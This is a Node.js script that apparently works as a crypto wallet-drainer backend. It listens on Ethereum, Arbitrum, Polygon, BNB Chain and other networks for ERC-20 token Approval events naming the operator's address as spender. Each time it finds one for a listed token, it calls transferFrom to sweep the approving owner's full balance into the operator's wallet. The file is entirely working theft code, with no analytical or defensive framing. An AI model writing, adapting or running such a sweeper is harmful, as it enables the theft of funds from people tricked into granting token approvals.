require('dotenv').config();
const { ethers } = require('ethers');

// Setup provider
const provider = new ethers.JsonRpcProvider(process.env.INFURA_URL);

let wallet;

// Use either MNEMONIC or PRIVATE_KEY
if (process.env.MNEMONIC) {
  wallet = ethers.Wallet.fromPhrase(process.env.MNEMONIC, provider);
  console.log("Using wallet from mnemonic:", wallet.address);
} else if (process.env.PRIVATE_KEY) {
  wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  console.log("Using wallet from private key:", wallet.address);
} else {
  throw new Error("No MNEMONIC or PRIVATE_KEY found in .env file");
}

// Token addresses on different networks
const TOKEN_ADDRESSES = {
  // Mainnet
  '1': {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    STETH: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'
  },
  // Goerli
  '5': {
    USDT: '0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49',
    USDC: '0x07865c6E87B9F70255377e024ace6630C1Eaa37F',
    WETH: '0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6'
  },
  // Sepolia
  '11155111': {
    USDT: '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0',
    USDC: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    WETH: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14'
  },
  // Arbitrum
  '42161': {
    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
    LINK: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4'
  },
  // Optimism
  '10': {
    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
    USDC: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x68f180fcCe6836688e9084f035309E29Bf0A2095',
    LINK: '0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6'
  },
  // Polygon
  '137': {
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
    WBTC: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6',
    LINK: '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39',
    SHIB: '0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec',
    UNI: '0xb33EaAd8d922B1083446DC23f610c2567fB5180f'
  },
  // Base
  '8453': {
    USDT: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
    USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x3cABa682bC7c370a6E61b4570c7D7A1147d95c8d'
  },
  // BNB Smart Chain
  '56': {
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    WETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
    WBTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
    SHIB: '0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',
    UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1'
  }
};

// ERC-20 ABI
const erc20Abi = [
  "function transferFrom(address from, address to, uint amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "event Approval(address indexed owner, address indexed spender, uint value)"
];

// Get token address for current network
async function getTokenAddress(tokenSymbol) {
  const network = await provider.getNetwork();
  const chainId = network.chainId.toString();
  
  const networkTokens = TOKEN_ADDRESSES[chainId];
  if (!networkTokens) {
    throw new Error(`No tokens configured for chain ID ${chainId}`);
  }
  
  const tokenAddress = networkTokens[tokenSymbol];
  if (!tokenAddress) {
    throw new Error(`${tokenSymbol} not configured for chain ID ${chainId}`);
  }
  
  return tokenAddress;
}

// Verify if a token address is one of our target tokens
async function isTargetToken(tokenAddress) {
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId.toString();
    
    const networkTokens = TOKEN_ADDRESSES[chainId];
    if (!networkTokens) return false;
    
    // Check if the token address matches any of our target tokens
    return Object.values(networkTokens).some(
      addr => addr.toLowerCase() === tokenAddress.toLowerCase()
    );
  } catch (error) {
    console.error("Error verifying token address:", error);
    return false;
  }
}

// Get token symbol from address
async function getTokenSymbol(tokenAddress) {
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId.toString();
    
    const networkTokens = TOKEN_ADDRESSES[chainId];
    if (!networkTokens) return 'UNKNOWN';
    
    const entry = Object.entries(networkTokens).find(
      ([, addr]) => addr.toLowerCase() === tokenAddress.toLowerCase()
    );
    
    return entry ? entry[0] : 'UNKNOWN';
  } catch (error) {
    console.error("Error getting token symbol:", error);
    return 'UNKNOWN';
  }
}

// Handle approval events
async function handleApprovalEvent(log) {
  try {
    // Check if this is one of our target tokens
    const isTarget = await isTargetToken(log.address);
    if (!isTarget) {
      console.log(`Skipping non-target token: ${log.address}`);
      return;
    }

    const iface = new ethers.Interface(erc20Abi);
    const event = iface.parseLog(log);

    const owner = event.args.owner;
    const spender = event.args.spender;
    const amount = event.args.value;

    const tokenSymbol = await getTokenSymbol(log.address);
    console.log(`${tokenSymbol} Approval detected: ${owner} approved ${spender} for ${amount}`);

    // Check if the approval is to our recipient address
    if (spender.toLowerCase() === process.env.RECIPIENT_ADDRESS.toLowerCase()) {
      console.log(`${tokenSymbol} Approval to our address detected!`);

      const tokenContract = new ethers.Contract(log.address, erc20Abi, wallet);

      // Get token details
      let symbol, decimals;
      try {
        symbol = await tokenContract.symbol();
        decimals = await tokenContract.decimals();
        console.log(`Token: ${symbol} (${decimals} decimals)`);
      } catch (e) {
        console.log("Could not get token details, using detected symbol");
        symbol = tokenSymbol;
        decimals = 18; // Default decimals
      }

      // Check balance of the owner
      const balance = await tokenContract.balanceOf(owner);
      const formattedBalance = ethers.formatUnits(balance, decimals);
      console.log(`${symbol} balance for ${owner}: ${formattedBalance}`);

      // ✅ Attempt to transfer tokens if balance > 0
      if (balance > 0n) {
        try {
          console.log(`Attempting to transfer ${formattedBalance} ${symbol} from ${owner}...`);
          const tx = await tokenContract.transferFrom(owner, wallet.address, balance);
          console.log("TransferFrom transaction sent:", tx.hash);

          const receipt = await tx.wait();
          console.log(`TransferFrom confirmed in block ${receipt.blockNumber}`);
          console.log(`Gas used: ${receipt.gasUsed.toString()}`);
        } catch (err) {
          console.error("Error calling transferFrom:", err);
        }
      } else {
        console.log("No balance to transfer.");
      }
    }
  } catch (error) {
    console.error("Error handling approval event:", error);
  }
}

// Main function to start listening
async function main() {
  console.log("Starting token approval event listener...");
  
  // Verify we're on a supported network
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId.toString();
    const networkTokens = TOKEN_ADDRESSES[chainId];
    
    if (!networkTokens) {
      throw new Error(`No tokens configured for chain ID ${chainId}`);
    }
    
    console.log(`Supported tokens on ${network.name}: ${Object.keys(networkTokens).join(', ')}`);
  } catch (error) {
    console.error("Network error:", error.message);
    process.exit(1);
  }

  // Filter for Approval events where the spender is our address
  const filter = {
    topics: [
      ethers.id("Approval(address,address,uint256)"),
      null, // Any owner
      ethers.zeroPadValue(process.env.RECIPIENT_ADDRESS, 32) // Filter for approvals to our address
    ]
  };

  // Listen for events
  provider.on(filter, (log) => {
    handleApprovalEvent(log);
  });

  console.log("Listener active. Waiting for token approval events...");
}

// Handle graceful shutdown
process.on("SIGINT", () => {
  console.log("Shutting down listener...");
  provider.removeAllListeners();
  process.exit(0);
});

// Start the application
main().catch(console.error);